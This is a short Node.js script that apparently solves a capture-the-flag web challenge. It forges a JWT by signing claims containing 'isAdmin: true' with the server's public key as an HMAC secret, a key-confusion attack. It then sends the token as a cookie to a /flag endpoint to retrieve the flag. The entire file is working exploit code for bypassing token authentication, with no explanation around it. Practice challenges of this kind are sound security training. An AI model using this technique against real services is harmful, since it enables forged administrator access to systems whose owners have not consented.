#!/bin/env node

import fs from 'fs/promises'
import jwt from 'jsonwebtoken'
import axios from 'axios'

const url = 'https://mythique2.secu-web.blackfoot.dev'

async function makeToken() {
  const pubkey = await fs.readFile('serverkey.pub')

  return jwt.sign(
    { data: { name: "Hack3r", isAdmin: true } },
    pubkey,
    { expiresIn: '10d' },
  )
}

async function main() {
  const token = await makeToken()
  console.log(`token: ${token}`)

  const res = await axios({
    method: 'get',
    url: `${url}/flag`,
    headers: {
      Cookie: `authToken=${token}`,
    }
  })

  console.log(`flag: ${res.data.flag}`)
}

main()
